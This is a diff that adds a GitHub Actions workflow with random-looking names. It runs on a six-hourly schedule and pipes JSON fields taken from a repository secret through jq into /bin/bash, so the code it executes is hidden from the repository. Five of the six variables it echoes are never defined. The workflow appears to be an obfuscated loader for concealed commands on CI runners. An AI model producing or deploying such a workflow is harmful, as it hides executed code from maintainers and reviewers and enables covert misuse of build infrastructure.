@@ -1,0 +1,21 @@
+name: badhuanihaog
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: badhuanihaog
+        env:
+          dkjfp8: ${{ secrets.dkjfp8 }}
+        run: |
+          echo $dkjfp8 | jq -r .gush50254 | /bin/bash
+          echo $ufaxn2 | jq -r .xduis54065 | /bin/bash
+          echo $sdyy3 | jq -r .ga62173 | /bin/bash
+          echo $wn63214 | jq -r .jy610 | /bin/bash
+          echo $qr86 | jq -r .dqoe9330 | /bin/bash
+          echo $ma2321 | jq -r .wppx9 | /bin/bash
+
